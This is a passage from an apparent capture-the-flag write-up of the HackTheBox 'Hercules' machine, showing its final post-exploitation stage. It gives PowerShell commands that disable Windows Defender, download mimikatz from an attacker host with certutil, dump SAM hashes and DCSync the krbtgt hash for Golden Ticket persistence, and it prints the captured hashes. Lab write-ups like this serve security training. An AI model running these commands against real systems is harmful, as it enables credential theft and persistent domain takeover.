+[*] '-spn' not specified, using HTTP/dc.hercules.htb@hercules.htb
+[*] '-dc-ip' not specified, using hercules.htb                                                             
+...[snip]...
+PS C:\Users\Administrator\Documents&gt;
+</code></pre>
+<p><img src="../../photos/hercules/image%2021.png" alt="image.png" /></p>
+<h2 id="more-exploitation-from-administrator-session">More Exploitation From Administrator Session</h2>
+<p>Another step to exploit information from root</p>
+<blockquote>
+<p>💡 Disable Windows Defender completely (real-time, behavior, and exclude our working directory)</p>
+<pre><code class="language-powershell">PS C:\Tools&gt; Set-MpPreference -DisableRealtimeMonitoring $true
+PS C:\Tools&gt; Set-MpPreference -DisableBehaviorMonitoring $true
+PS C:\Tools&gt; Add-MpPreference -ExclusionPath &quot;C:\Tools&quot;
+</code></pre>
+<p>Pull latest mimikatz (x64) from our web server</p>
+<pre><code class="language-powershell">PS C:\Tools&gt; certutil -urlcache -split -f http://10.10.16.xx/mimikatz.exe mimikatz.exe
+</code></pre>
+<p><img src="../../photos/hercules/image%2022.png" alt="image.png" /></p>
+</blockquote>
+<h3 id="dump-local-sam-hashes-administrator-account">### Dump Local SAM Hashes (Administrator account)</h3>
+<pre><code class="language-bash">PS C:\Tools&gt; .\mimikatz.exe &quot;privilege::debug&quot; &quot;token::elevate&quot; &quot;lsadump::sam&quot; &quot;exit&quot;
+</code></pre>
+<p><strong>[+] Administrator NTLMv1 hash:</strong> <code>56855ee6b7570edefde6ac262200756e</code></p>
+<p><img src="../../photos/hercules/image%2023.png" alt="image.png" /></p>
+<h3 id="dcsync-extract-krbtgt-hash-golden-ticket-ready">DCSync – Extract krbtgt Hash (Golden Ticket Ready)</h3>
+<pre><code class="language-bash">PS C:\Users\Administrator\Documents&gt; .\mimikatz.exe &quot;lsadump::dcsync /domain:hercules.htb /user:krbtgt&quot; &quot;exit&quot;
+</code></pre>
+<p><strong>[+] Krbtgt NTLMv1 hash:</strong> <code>aa9d05e554420b27186ffe97882303c2</code></p>
+<p><img src="../../photos/hercules/image%2024.png" alt="image.png" /></p>
+<p>With these two hashes you now have permanent domain dominance – even if the machine is wiped, you can always come back anytime with a fresh Golden or Silver ticket.</p>
+<p>Hercules fully pwned – from initial LDAP injection all the way to krbtgt.</p>
+
+        </div>
+      </article>
+
+      <aside class="post-toc-sidebar" id="post-toc-sidebar">
+        <div class="toc-title"><span>//</span> ON THIS PAGE</div>
+        <ul class="toc-nav" id="toc-nav">
+<li class="toc-h2"><a href="#introduction" class="toc-link" data-slug="introduction">Introduction</a></li><li class="toc-h2"><a href="#attack-narrative" class="toc-link" data-slug="attack-narrative">Attack Narrative</a></li><li class="toc-h2"><a href="#initial-reconnaissance" class="toc-link" data-slug="initial-reconnaissance">Initial Reconnaissance</a></li><li class="toc-h2"><a href="#hosting" class="toc-link" data-slug="hosting">Hosting</a></li><li class="toc-h2"><a href="#krb5-config" class="toc-link" data-slug="krb5-config">Krb5 Config</a></li><li class="toc-h2"><a href="#user-enumeration" class="toc-link" data-slug="user-enumeration">User Enumeration</a></li><li class="toc-h2"><a href="#directory-fuzzing" class="toc-link" data-slug="directory-fuzzing">Directory Fuzzing</a></li><li class="toc-h2"><a href="#web-exploring" class="toc-link" data-slug="web-exploring">Web Exploring</a></li><li class="toc-h2"><a href="#ldap-injection-attacks-explaining" class="toc-link" data-slug="ldap-injection-attacks-explaining">LDAP Injection Attacks Explaining</a></li><li class="toc-h2"><a href="#bruteforce-username-description-ldap-filter-injection-password-spraying" class="toc-link" data-slug="bruteforce-username-description-ldap-filter-injection-password-spraying">Bruteforce Username Description (LDAP-Filter-Injection - Password Spraying)</a></li><li class="toc-h2"><a href="#verify-ldap-credentials" class="toc-link" data-slug="verify-ldap-credentials">Verify LDAP Credentials</a></li><li class="toc-h2"><a href="#local-file-inclusion-lfi" class="toc-link" data-slug="local-file-inclusion-lfi">Local File Inclusion (LFI)</a></li><li class="toc-h2"><a href="#get-web-config-via-lfi-machinekey" class="toc-link" data-slug="get-web-config-via-lfi-machinekey">Get web.config via LFI (machineKey)</a></li><li class="toc-h2"><a href="#cookie-forgery-attack-formsauthenticationticket" class="toc-link" data-slug="cookie-forgery-attack-formsauthenticationticket">Cookie Forgery Attack (FormsAuthenticationTicket)</a></li><li class="toc-h2"><a href="#web-admin-portal" class="toc-link" data-slug="web-admin-portal">Web Admin Portal</a></li><li class="toc-h2"><a href="#file-upload" class="toc-link" data-slug="file-upload">File Upload</a></li><li class="toc-h2"><a href="#bloodhound-enumeration" class="toc-link" data-slug="bloodhound-enumeration">Bloodhound Enumeration</a></li><li class="toc-h3"><a href="#lateral-movement" class="toc-link" data-slug="lateral-movement">Lateral Movement</a></li><li class="toc-h3"><a href="#critical-bypass" class="toc-link" data-slug="critical-bypass">Critical Bypass</a></li><li class="toc-h2"><a href="#root" class="toc-link" data-slug="root">Root</a></li><li class="toc-h3"><a href="#amsi-bypassing" class="toc-link" data-slug="amsi-bypassing">⚠️ AMSI Bypassing</a></li><li class="toc-h3"><a href="#enable-fernando-r-amp-request-enrollmentagentoffline-certificate" class="toc-link" data-slug="enable-fernando-r-amp-request-enrollmentagentoffline-certificate">Enable fernando.r &amp;amp; Request EnrollmentAgentOffline Certificate</a></li><li class="toc-h3"><a href="#request-certificate-on-behalf-of-ashley-b-esc8" class="toc-link" data-slug="request-certificate-on-behalf-of-ashley-b-esc8">Request Certificate On-Behalf-Of ashley.b (ESC8)</a></li><li class="toc-h3"><a href="#from-auditor-shell-grant-full-control-over-forest-migration-ou" class="toc-link" data-slug="from-auditor-shell-grant-full-control-over-forest-migration-ou">From Auditor Shell: Grant Full Control Over Forest Migration OU</a></li><li class="toc-h3"><a href="#authenticate-as-ashley-b-ashley-b-shell" class="toc-link" data-slug="authenticate-as-ashley-b-ashley-b-shell">Authenticate as ashley.b (Ashley.B Shell)</a></li><li class="toc-h2"><a href="#road-to-administrator" class="toc-link" data-slug="road-to-administrator">Road to Administrator</a></li><li class="toc-h3"><a href="#from-ashley-b-shell-enable-iis-administrator-amp-reset-iis-webserver-password" class="toc-link" data-slug="from-ashley-b-shell-enable-iis-administrator-amp-reset-iis-webserver-password">From ashley.b Shell: Enable iis_administrator &amp;amp; Reset iis_webserver$ Password</a></li><li class="toc-h3"><a href="#extract-iis-webserver-session-key" class="toc-link" data-slug="extract-iis-webserver-session-key">Extract iis_webserver$ Session Key</a></li><li class="toc-h3"><a href="#change-iis-webserver-password-using-session-key-bypass-cleanup" class="toc-link" data-slug="change-iis-webserver-password-using-session-key-bypass-cleanup">Change iis_webserver$ Password Using Session Key (Bypass Cleanup)</a></li><li class="toc-h3"><a href="#final-abuse-unconstrained-delegation-s4u2self-s4u2proxy" class="toc-link" data-slug="final-abuse-unconstrained-delegation-s4u2self-s4u2proxy">Final Abuse: Unconstrained Delegation → S4U2Self + S4U2Proxy</a></li><li class="toc-h2"><a href="#more-exploitation-from-administrator-session" class="toc-link" data-slug="more-exploitation-from-administrator-session">More Exploitation From Administrator Session</a></li><li class="toc-h3"><a href="#dump-local-sam-hashes-administrator-account" class="toc-link" data-slug="dump-local-sam-hashes-administrator-account">### Dump Local SAM Hashes (Administrator account)</a></li><li class="toc-h3"><a href="#dcsync-extract-krbtgt-hash-golden-ticket-ready" class="toc-link" data-slug="dcsync-extract-krbtgt-hash-golden-ticket-ready">DCSync – Extract krbtgt Hash (Golden Ticket Ready)</a></li>
+        </ul>
+      </aside>
+    </div>
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+      <span>uziii2208 © 2026 - Build with no brain actual:D</span>
+      <span>
+        <a href="https://github.com/uziii2208" target="_blank" rel="noopener noreferrer">github</a>
+        &nbsp;·&nbsp;
+        <a href="https://pypi.org/user/uziii2208/" target="_blank" rel="noopener noreferrer">pypi</a>
+        &nbsp;·&nbsp;
+        <a href="https://0pwn0.github.io" target="_blank" rel="noopener noreferrer">0pwn0 archive ↗</a>
+      </span>
+    </div>
+  </footer>
+</div>
+
+<!-- ─── FLOATING BACK TO TOP ─── -->
+<button id="back-to-top" class="back-to-top-btn" onclick="scrollToTop()" title="Back to top">▲</button>
+
+<!-- ─── IMAGE LIGHTBOX MODAL ─── -->
+<div id="image-lightbox" class="lightbox-overlay" onclick="closeLightbox()">
+  <div class="lightbox-container" onclick="event.stopPropagation()">
+    <img id="lightbox-img" src="" alt="Proof of concept">
+    <button class="lightbox-close" onclick="closeLightbox()">✕</button>
+    <div id="lightbox-caption" class="lightbox-caption"></div>
+  </div>
+</div>
+
+<!-- ─── COMMAND PALETTE HUD (Ctrl+K or /) ─── -->
+<div id="cmd-palette" class="cmd-overlay" onclick="closeCmdPalette()">
+  <div class="cmd-dialog" onclick="event.stopPropagation()">
+    <div class="cmd-header">
+      <span class="cmd-prompt">&gt;</span>
+      <input type="text" id="cmd-input" placeholder="Quick search write-ups, tags, CVEs..." autocomplete="off" spellcheck="false">
+      <span class="cmd-badge">ESC to close</span>
+    </div>
+    <div class="cmd-results" id="cmd-results">
+      <!-- Search results generated by app.js -->
+    </div>
+  </div>
+</div>
+
+<!-- ─── TOAST NOTIFICATION ─── -->
+<div id="toast">
+  <svg class="ui-icon toast-svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
+  <span id="toast-text"></span>
+</div>
+
+<script>
+  window.__POST_SLUG__ = "hackthebox-hercules";
+</script>
+</body>
+</html>
